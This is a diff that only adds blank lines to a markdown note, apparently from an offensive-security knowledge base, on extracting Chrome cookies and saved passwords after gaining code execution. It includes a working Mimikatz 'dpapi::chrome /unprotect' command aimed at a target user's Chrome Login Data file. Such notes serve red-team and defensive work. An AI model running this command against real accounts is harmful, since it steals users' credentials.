@@ -32,6 +32,8 @@ Attackers with code execution can extract Chrome cookies and passwords from the 
 
 Attackers with code execution can extract Chrome cookies and passwords from the current user's profile. This approach only works if code execution is from the context of the target user.
 
+
+
 # Instructions
 
 1. Identify the location of cookies or passwords, which are generally stored in the following locations:
@@ -44,11 +46,21 @@ Attackers with code execution can extract Chrome cookies and passwords from the 
 
 3. Run Mimikatz, specifying the full path to the cookies or credentials file. 
 
+
+
+
+
 **Command** ([[Mimikatz Extract Chrome Credentials from the Current User's Session]]):
 
 ```bash
 mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
 ```
+
+
+
+
+
+
 
 ## Platforms
 
@@ -73,3 +85,5 @@ mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\C
 - [[Chrome]]
 - [[dump]]
 - [[extract]]
+
+
